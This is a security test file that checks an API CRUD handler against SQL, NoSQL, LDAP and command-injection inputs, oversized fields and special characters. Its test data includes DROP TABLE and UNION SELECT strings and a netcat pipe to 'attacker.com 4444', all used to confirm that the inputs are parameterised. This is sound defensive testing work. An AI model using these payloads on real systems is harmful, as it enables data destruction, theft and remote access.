...
describe('API Handler - CRUD (Security)', () => {
  ...
  describe('SQL Injection Prevention', () => {
    it('should handle SQL injection attempt in email field on create', async () => {
      vi.mocked(mockAdapter.executeQuery).mockResolvedValue({
        success: true,
        data: {
          rows: [{ id: 10, ...crudTestData.maliciousInput.sqlInjectionInEmail }],
      ...
      const context: RequestContext = {
        ...baseContext,
        method: 'POST',
        body: crudTestData.maliciousInput.sqlInjectionInEmail,
      };

      const response = await create(context, baseConfig);

      expect(mockAdapter.executeQuery).toHaveBeenCalled();
      const queryCall = vi.mocked(mockAdapter.executeQuery).mock.calls[0][0];

      expect(queryCall.sql).toBeDefined();
      expect(queryCall.parameters).toBeDefined();
      expect(queryCall.parameters).toContain("'; DROP TABLE users; --");
      expect(queryCall.sql).not.toContain('DROP TABLE');
    });

    it('should handle SQL injection in WHERE clause', async () => {
      vi.mocked(mockAdapter.executeQuery).mockResolvedValue({
        success: true,
      ...
      const context: RequestContext = {
        ...baseContext,
        query: { 'where[email]': "'; DROP TABLE users; --" },
      };
    ...
    it('should handle SQL injection in ID parameter', async () => {
      ...
      if (response.status !== 400) {
        const queryCall = vi.mocked(mockAdapter.executeQuery).mock.calls[0][0];
        expect(queryCall.parameters).toBeDefined();
        expect(queryCall.parameters).toContain(maliciousId);
      }
    });

    it('should handle SQL comment injection in update', async () => {
      vi.mocked(mockAdapter.executeQuery).mockResolvedValue({
        success: true,
        data: {
          rows: [{ id: 1, name: '-- DROP TABLE users;' }],
          metadata: { rowCount: 1, affectedRows: 1 },
        },
      });
    ...
    it('should handle UNION-based SQL injection in where clause', async () => {
      vi.mocked(mockAdapter.executeQuery).mockResolvedValue({
        success: true,
        data: { rows: [], metadata: { rowCount: 0, affectedRows: 0 } },
      });

      const unionInjection = "1 UNION SELECT * FROM admin_users";
      const context: RequestContext = {
        ...baseContext,
        query: { 'where[id]': unionInjection },
      };
      ...
      if (response.status === 200) {
        const queryCall = vi.mocked(mockAdapter.executeQuery).mock.calls[0][0];
        expect(queryCall.parameters).toContain(unionInjection);
        expect(queryCall.sql).not.toContain('UNION SELECT');
      }
    });
  });
  ...
  describe('Oversized Input Handling', () => {
    it('should reject oversized name field', async () => {
      const context: RequestContext = {
        ...baseContext,
        method: 'POST',
        body: crudTestData.maliciousInput.oversizedName,
      };
    ...
    it('should handle very long email address', async () => {
      ...
      const context: RequestContext = {
        ...baseContext,
        method: 'POST',
        body: { email: veryLongEmail, name: 'User' },
      };
    ...
    it('should handle deeply nested WHERE conditions', async () => {
      const deeplyNested = {
        'where[$and][0][$and][0][$and][0][name]': 'test',
      };
  ...
  describe('Unicode and Special Characters', () => {
    it('should handle unicode characters in name field', async () => {
      vi.mocked(mockAdapter.executeQuery).mockResolvedValue({
        success: true,
        data: {
          rows: [{ id: 1, email: 'user@example.com', name: edgeCases.unicodeString }],
          metadata: { rowCount: 1, affectedRows: 1 },
        },
      });
      ...
      const context: RequestContext = {
        ...baseContext,
        method: 'POST',
        body: { email: 'user@example.com', name: edgeCases.unicodeString },
      };
    ...
    it('should handle null byte in input', async () => {
      const nullByteInput = { email: 'user@example.com', name: 'User\x00Admin' };
    ...
    it('should handle control characters in input', async () => {
      const controlCharsInput = { email: 'user@example.com', name: 'User\r\nAdmin' };

      const context: RequestContext = {
        ...baseContext,
        method: 'POST',
        body: controlCharsInput,
      };
    ...
    it('should handle bidirectional text override', async () => {
      const bidiOverride = { email: 'user@example.com', name: 'User\u202Enidma' };
  ...
  describe('NoSQL Injection Prevention', () => {
    it('should handle $where operator injection', async () => {
      const context: RequestContext = {
        ...baseContext,
        query: { 'where[$where]': 'function() { return true; }' },
      };
  ...
  describe('Command Injection Prevention', () => {
    it('should handle shell command in input', async () => {
    ...
    it('should handle pipe command injection', async () => {
      const pipeInjection = {
        email: 'user@example.com',
        name: 'user | nc attacker.com 4444',
      };
  ...
  describe('LDAP Injection Prevention', () => {
    it('should handle LDAP wildcard injection', async () => {
      const ldapWildcard = {
        email: 'user@example.com',
        name: '*)(uid=*))(|(uid=*',
      };
